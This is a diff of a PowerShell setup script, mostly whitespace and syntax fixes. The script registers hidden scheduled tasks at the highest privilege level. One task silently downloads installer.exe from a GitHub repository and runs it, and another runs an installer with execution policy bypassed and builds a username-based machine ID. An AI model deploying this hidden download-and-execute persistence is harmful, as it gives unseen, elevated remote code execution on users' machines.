@@ -61,7 +61,7 @@ $settings = New-ScheduledTaskSettingsSet `
 
 # Installer task
 $installerTaskName = "WinRunInstaller"
-$cmd = 'powershell.exe -Command "$p=\"$env:APPDATA\run\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path$p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o=\"$p\installer.exe\"; Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; Start-Process$o"'
+$cmd = 'powershell.exe -Command "$p=\"$env:APPDATA\run\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o=\"$p\installer.exe\"; Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; Start-Process $o"'
 $installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command $cmd"
 $installerSettings = New-ScheduledTaskSettingsSet `
   -AllowStartIfOnBatteries `
@@ -69,27 +69,26 @@ $installerSettings = New-ScheduledTaskSettingsSet `
   -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
   -Hidden
 
-Register-ScheduledTask -TaskName $taskName -Action$action -Trigger $trigger -Settings$settings -RunLevel Highest -Force | Out-Null
-Register-ScheduledTask -TaskName $installerTaskName -Action $installerAction -Settings$installerSettings -RunLevel Highest -Force | Out-Null
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
+Register-ScheduledTask -TaskName $installerTaskName -Action $installerAction -Settings $installerSettings -RunLevel Highest -Force | Out-Null
 
-# Mark installed (Fixed broken pipe operator and variable assignment)
+# Mark installed
 Start-Process powershell.exe -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'" -WindowStyle Hidden -Wait
-$latestCommit \vert{} Out-File$datFile
+$latestCommit | Out-File $datFile
 
-# Create ID (Fixed missing spaces in command execution)
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
 if (Test-Path $IdPath) {
-  $raw = (Get-Content$IdPath -Raw).Trim()
+  $raw = (Get-Content $IdPath -Raw).Trim()
   if ($raw.Length -ge 8) {
-    $uniqueId =$raw.Substring(0, 8)
+    $uniqueId = $raw.Substring(0, 8)
   }
   else {
-    $uniqueId =$raw
+    $uniqueId = $raw
   }
 }
 else {
   $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
-  Set-Content -Path $IdPath -Value$uniqueId
+  Set-Content -Path $IdPath -Value $uniqueId
 }
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
 
